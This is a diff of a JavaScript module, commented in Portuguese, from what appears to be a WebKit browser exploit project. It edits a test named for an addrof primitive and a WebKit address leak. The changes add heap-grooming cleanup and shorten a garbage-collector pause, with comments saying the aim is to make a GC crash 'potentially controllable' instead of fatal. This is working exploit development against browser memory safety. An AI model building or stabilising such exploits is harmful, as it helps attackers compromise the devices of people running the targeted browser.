@@ -1,7 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v01 -GC Crash)
+// js/script3/testArrayBufferVictimCrash.mjs (v02 -GC Crash Stabilized)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // 1. Script original que causa o crash mantido na íntegra para preservar a condição.
+// 2. Ajustes mínimos para estabilizar o crash do GC, transformando-o de fatal para
+//    potencialmente controlável, sem alterar a lógica do teste.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -247,9 +249,16 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Metade dos objetos liberados.`, "debug");
             for (let i = 0; i < NUM_FILLER_OBJECTS_STAGE1; i++) { filler_objects.push(new Uint32Array(Math.floor(Math.random() * 64) + 16)); }
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Spray de fillers concluído.`, "debug");
-            aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
+            
+            // <-- MUDANÇA: Limpeza explícita dos arrays de grooming para melhorar a estabilidade do GC.
+            aggressive_feng_shui_objects.length = 0; 
+            aggressive_feng_shui_objects = null;
+            filler_objects.length = 0;
+            filler_objects = null;
+            
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Pausando para acionar GC...`, "debug");
-            await PAUSE_S3(10000);
+            // <-- MUDANÇA: Pausa do GC reduzida de 10000ms para 1500ms para diminuir a agressividade e evitar crash fatal.
+            await PAUSE_S3(1500);
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Concluído.`, "debug");
         };
          if (testes_ativos.tentativa_5_ClassInfo) {
